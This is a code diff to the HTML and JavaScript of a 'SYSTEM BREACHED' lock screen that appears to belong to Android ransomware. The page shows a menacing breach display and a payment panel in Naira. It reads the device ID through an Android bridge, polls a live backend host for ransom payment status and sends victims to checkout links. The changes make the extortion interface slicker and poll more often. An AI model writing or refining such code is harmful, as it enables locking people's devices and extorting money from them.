@@ -4,20 +4,48 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>SYSTEM BREACHED</title>
+
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Rajdhani:wght@400;500;600;700&display=swap');
-:root { --bg:#050000; --red:#ff0033; --dark-red:#550011; --text:#f8f4ff; --muted:#a88f8f; --cyan:#00ffcc; }
-* { box-sizing:border-box; margin:0; padding:0; -webkit-tap-highlight-color:transparent; user-select:none; }
-body { height:100dvh; overflow:hidden; background:var(--bg); color:var(--text); font-family:'Rajdhani',sans-serif; }
+
+:root {
+    --bg:#050000;
+    --red:#ff0033;
+    --dark-red:#550011;
+    --text:#f8f4ff;
+    --muted:#a88f8f;
+    --cyan:#00ffcc;
+}
+
+* {
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    -webkit-tap-highlight-color:transparent;
+    user-select:none;
+}
+
+body {
+    height:100dvh;
+    overflow:hidden;
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Rajdhani',sans-serif;
+}
+
 button,input { font:inherit; }
 
+/* Background Effects */
 #particles { position:fixed; inset:0; width:100%; height:100%; pointer-events:none; z-index:0; }
 .ambient { position:fixed; width:350px; height:350px; border-radius:50%; filter:blur(100px); pointer-events:none; z-index:0; }
 .ambient.one { background:rgba(255,0,50,.15); top:10%; left:-180px; }
 .ambient.two { background:rgba(255,0,50,.2); bottom:0; right:-180px; }
 .scanlines { position:fixed; inset:0; z-index:10; pointer-events:none; opacity:.15; background:repeating-linear-gradient(transparent 0px, transparent 3px, rgba(255,0,0,.1) 4px); }
+
+/* Hidden Trigger */
 #hiddenTrigger { position: absolute; top: 0; left: 0; width: 120px; height: 120px; z-index: 999; opacity: 0; }
 
+/* Layout */
 .screen { position:relative; z-index:2; width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:space-between; padding:30px 22px 24px; }
 .topbar { width:100%; max-width:430px; display:flex; align-items:center; justify-content:space-between; }
 .brand { font-family:'Orbitron',sans-serif; font-size:21px; font-weight:900; letter-spacing:5px; color:var(--red); text-shadow:0 0 20px var(--red); }
@@ -26,20 +54,23 @@ button,input { font:inherit; }
 .live-dot { width:7px; height:7px; background:var(--red); border-radius:50%; box-shadow:0 0 12px var(--red); animation:blink 1.5s infinite; }
 @keyframes blink { 50% { opacity:.25; } }
 
+/* Reactor Core */
 .main-stage { width:100%; max-width:430px; display:flex; flex-direction:column; align-items:center; text-align:center; flex:1; justify-content:center; min-height:0; }
 .reactor { position:relative; width:min(60vw,240px); aspect-ratio:1; display:flex; align-items:center; justify-content:center; margin:0 0 15px; }
 .reactor-glow { position:absolute; inset:18%; background:rgba(255,0,50,.2); filter:blur(40px); border-radius:50%; animation:corePulse 3s ease-in-out infinite; }
 @keyframes corePulse { 0%,100% { transform:scale(.85); opacity:.5; } 50% { transform:scale(1.2); opacity:1; } }
 .ring { position:absolute; border-radius:50%; border-style:solid; pointer-events:none; }
 .ring.outer { inset:1%; border-width:2px; border-color:rgba(255,0,50,.6); box-shadow:0 0 15px rgba(255,0,50,.4), inset 0 0 15px rgba(255,0,50,.2); animation:rotate 16s linear infinite; }
+.ring.outer:before, .ring.outer:after { content:''; position:absolute; width:9px; height:9px; background:#ff6666; border-radius:50%; box-shadow:0 0 15px #ff0033; }
+.ring.outer:before { top:10%; left:15%; } .ring.outer:after { bottom:10%; right:15%; }
 .ring.middle { inset:9%; border-width:1px; border-color:rgba(255,255,255,.1); border-top-color:#ff3366; border-bottom-color:#660011; animation:rotateReverse 10s linear infinite; }
 .ring.inner { inset:17%; border-width:2px; border-color:transparent; border-top-color:#ff3366; border-right-color:rgba(255,0,50,.6); box-shadow:0 0 20px rgba(255,0,50,.3); animation:rotate 6s linear infinite; }
 .ring.dashed { inset:5%; border-width:1px; border-style:dashed; border-color:rgba(255,0,50,.5); animation:rotateReverse 24s linear infinite; }
 @keyframes rotate { to { transform:rotate(360deg); } }
 @keyframes rotateReverse { to { transform:rotate(-360deg); } }
-.core { position:relative; z-index:3; width:48%; aspect-ratio:1; border-radius:50%; display:flex; align-items:center; justify-content:center; background:radial-gradient(circle at 35% 25%, #ffb3b3 0%, #cc0022 15%, #550011 42%, #1a0005 75%, #050000 100%); border:2px solid rgba(255,150,150,.9); box-shadow:0 0 12px #ff0033, 0 0 35px rgba(255,0,50,.8), inset 0 0 25px rgba(255,255,255,.2); animation:coreFloat 4s ease-in-out infinite; }
+.core { position:relative; z-index:3; width:48%; aspect-ratio:1; border-radius:50%; display:flex; align-items:center; justify-content:center; background:radial-gradient(circle at 35% 25%, #ffb3b3 0%, #cc0022 15%, #550011 42%, #1a0005 75%, #050000 100%); border:2px solid rgba(255,150,150,.9); box-shadow:0 0 12px #ff0033, 0 0 35px rgba(255,0,50,.8), 0 0 85px rgba(255,0,0,.45), inset 0 0 25px rgba(255,255,255,.2); animation:coreFloat 4s ease-in-out infinite; }
 @keyframes coreFloat { 0%,100% { transform:scale(.97); } 50% { transform:scale(1.04); } }
-.core-inner { width:72%; aspect-ratio:1; border-radius:50%; display:flex; align-items:center; justify-content:center; border:1px solid rgba(255,255,255,.5); background:radial-gradient(circle,#ffb3b3 0%,#aa0022 25%,#330008 75%); }
+.core-inner { width:72%; aspect-ratio:1; border-radius:50%; display:flex; align-items:center; justify-content:center; border:1px solid rgba(255,255,255,.5); background:radial-gradient(circle,#ffb3b3 0%,#aa0022 25%,#330008 75%); box-shadow:inset 0 0 20px rgba(255,255,255,.5); }
 .core-symbol { font-size:clamp(36px,12vw,58px); color:white; text-shadow:0 0 10px white,0 0 25px #ff0033; }
 
 .system-label { font-family:'Orbitron',sans-serif; font-size:10px; color:#ff3366; letter-spacing:5px; margin-bottom:8px; }
@@ -47,6 +78,7 @@ button,input { font:inherit; }
 .title span { color:var(--red); }
 .subtitle { color:#a88f8f; font-size:14px; letter-spacing:.6px; margin-top:8px; line-height:1.4; }
 
+/* Payment HUD */
 .payment-box { width:100%; max-width:430px; background:linear-gradient(145deg,rgba(255,0,50,.08),rgba(0,0,0,.4)); border:1px solid rgba(255,0,50,.3); border-radius:16px; padding:15px; margin-bottom:15px; text-align:left; }
 .payment-row { display:flex; justify-content:space-between; margin-bottom:8px; font-size:14px; color:var(--muted); }
 .payment-row span:last-child { font-family:'Orbitron',sans-serif; color:var(--text); font-weight:bold; }
@@ -59,6 +91,7 @@ button,input { font:inherit; }
 .pay-btn:active { background:rgba(255,0,50,0.3); }
 .pay-btn:disabled { opacity: 0.5; }
 
+/* Auth Screen */
 .auth-screen { position:fixed; z-index:20; inset:0; display:none; align-items:center; justify-content:center; padding:25px; background:rgba(5,0,0,.95); backdrop-filter:blur(25px); }
 .auth-screen.active { display:flex; animation:fadeIn .4s ease; }
 @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
@@ -68,6 +101,7 @@ button,input { font:inherit; }
 .auth-input { width:100%; padding:17px; border-radius:10px; border:1px solid rgba(255,0,50,.5); outline:none; background:rgba(0,0,0,.35); color:white; text-align:center; font-family:'Orbitron',sans-serif; font-size:15px; letter-spacing:5px; margin:20px 0 15px; transition:.3s; }
 .auth-input:focus { border-color:#ff6688; box-shadow:0 0 18px rgba(255,0,50,.25); }
 
+/* Success Screen */
 .success-screen { position:fixed; inset:0; z-index:30; display:none; align-items:center; justify-content:center; flex-direction:column; background:#050000; text-align:center; padding:25px; }
 .success-screen.active { display:flex; animation:fadeIn .5s ease; }
 .success-icon { font-size:75px; color:#00ffcc; text-shadow:0 0 35px #00ffcc; margin-bottom:25px; }
@@ -197,6 +231,7 @@ resizeCanvas(); drawParticles();
 const BACKEND_URL = "https://fr4nx.wisp.uno"; 
 let deviceId = Android.getDeviceId();
 let hasUnlocked = false;
+let isSyncing = false;
 
 function checkPaymentStatus() {
     if (hasUnlocked) return;
@@ -215,11 +250,19 @@ function checkPaymentStatus() {
             } else if (data.ok) {
                 let paid = data.amount_paid / 100;
                 let target = data.target / 100;
-                document.getElementById("paidAmount").innerText = `₦ ${paid.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+                
+                if (isSyncing && paid === 0) {
+                    document.getElementById("paidAmount").innerText = "SYNCING...";
+                } else {
+                    document.getElementById("paidAmount").innerText = `₦ ${paid.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+                }
+                
                 document.getElementById("targetAmount").innerText = `₦ ${target.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
                 let percent = (paid / target) * 100;
                 if(percent > 100) percent = 100;
                 document.getElementById("payProgress").style.width = `${percent}%`;
+                
+                if (paid > 0) isSyncing = false; 
             }
         }).catch(e => console.log("Polling error:", e));
 }
@@ -228,7 +271,9 @@ window.onload = function() {
     setTimeout(checkPaymentStatus, 1000);
     setTimeout(checkPaymentStatus, 3000);
 };
-setInterval(checkPaymentStatus, 5000);
+
+// Poll every 2 seconds
+setInterval(checkPaymentStatus, 2000);
 
 function payAmount(amount) {
     const btns = document.querySelectorAll('.pay-btn');
@@ -238,7 +283,7 @@ function payAmount(amount) {
         .then(res => res.json())
         .then(data => {
             if (data.ok && data.checkout_url) {
-                // OverlayService intercepts and opens in external browser
+                isSyncing = true;
                 window.location.href = data.checkout_url;
                 setTimeout(() => { btns.forEach(b => b.disabled = false); }, 3000);
             } else {
